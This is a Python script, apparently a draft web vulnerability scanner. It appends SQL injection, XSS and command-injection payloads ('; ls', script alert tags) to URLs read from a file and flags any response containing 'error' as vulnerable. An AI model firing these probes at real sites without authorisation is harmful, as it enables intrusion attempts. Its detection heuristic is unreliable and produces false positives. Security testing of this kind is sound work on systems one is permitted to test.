import requests

# Function to read URLs from a text file
def get_urls(file_path):
    urls = []
    with open(file_path, "r") as file:
        for line in file:
            urls.append(line.strip())
    return urls

# Define payloads for different vulnerabilities
payloads = {
    "sql_injection": ["' OR '1'='1", "' OR 1=1 --", "' OR 'a'='a"],
    "xss": ["<script>alert('XSS')</script>", "><img src=x onerror=alert('XSS')>"],
    "command_injection": ["; ls", "&& ls", "| ls"]
}

# Test each payload on the target URL
def test_vulnerability(url, payload):
    try:
        response = requests.get(url + payload)
        if "error" in response.text.lower() or payload in response.text:
            return True  # Vulnerability likely present
    except requests.exceptions.RequestException as e:
        print(f"Error connecting to {url}: {e}")
    return False  # No vulnerability detected

# Main function to scan each URL
def scan_urls(urls):
    results = []
    for url in urls:
        for vuln_type, payload_list in payloads.items():
            for payload in payload_list:
                is_vulnerable = test_vulnerability(url, payload)
                results.append((url, vuln_type, payload, is_vulnerable))
                if is_vulnerable:
                    print(f"[VULNERABLE] {url} with payload: {payload}")
                else:
                    print(f"[SAFE] {url} with payload: {payload}")
    return results

# Entry point
if __name__ == "__main__":
    file_path = input("Enter the path to your URLs file: ")
    urls = get_urls(file_path)
    scan_results = scan_urls(urls)
    # Placeholder for generating reports, will be added in later steps
